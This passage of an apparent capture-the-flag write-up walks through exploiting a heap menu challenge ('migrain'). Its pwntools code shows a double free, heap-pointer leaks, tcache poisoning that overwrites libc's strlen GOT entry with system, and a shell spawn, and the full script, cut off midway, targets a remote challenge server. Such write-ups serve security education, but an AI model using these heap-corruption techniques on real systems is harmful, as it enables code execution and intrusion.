<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Fulfill tcache</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">destroy</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">198</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">197</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">198</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Leak new heap</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="mi">197</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">demangle</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Empty tcache</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Tcache poisoning</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1f6080</span> <span class="c1"># strlen GOT entry address</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">,</span> <span class="n">target</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Use 2 tcache items</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Poison the libc GOT entries, because this</span>
</span></span><span class="line"><span class="cl"><span class="c1"># allocation will allocate a new chunk in the target,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># which is strlen GOT entry address</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Remember that add function memset the chunk to 0, so we</span>
</span></span><span class="line"><span class="cl"><span class="c1"># need to ensure the other GOT entry near strlen remains the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># same</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff976890</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff972710</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff973db0</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff976b80</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff973660</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff9719c0</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff822180</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff822190</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff8ad6d0</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff970b60</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff974190</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff8221d0</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">[:</span><span class="mh">0x64</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># View index -4 manually</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, if we call <code>view</code> to the chunk which contains <code>/bin/sh</code> string, we will spawn a shell.</p>
<img src="https://i.imgur.com/rahbG0l.png">
<p>Full script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;migrain_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ld = ELF(&#34;./ld-2.37.so&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;137.184.6.25&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># remote_url = &#39;localhost&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">17001</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># gdb.attach(r, gdbscript=gdbscript)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">is_heap_base</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_heap_base</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">&lt;&lt;</span> <span class="mi">52</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">mask</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">v</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">            <span class="n">val</span> <span class="o">^=</span> <span class="p">(</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">mask</span> <span class="o">&gt;&gt;=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mangle</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Max size = 0x64, chunk_size = 0x70</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Payload: &#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">destroy</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;destroy: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">neg</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span><span class="o">-</span><span class="mi">256</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Max 0xff</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">200</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Fulfill tcache</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">destroy</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Fulfill tcache&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">198</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">197</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">198</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;fastbin dup&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="mi">198</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">demangle</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">-</span><span class="mh">0x6e80</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Empty tcache</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">fake_chunk</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span>
</span></span><span class="line"><span class="cl">    <span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;tcache empty&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">,</span> <span class="n">target</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;finished allocating a new chunk&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Use 2 tcache items</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Allocate our fake chunk, where this will change the size of the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># below chunk to 0x460</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leaked_heap</span><span class="o">-</span><span class="mh">0x6e30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
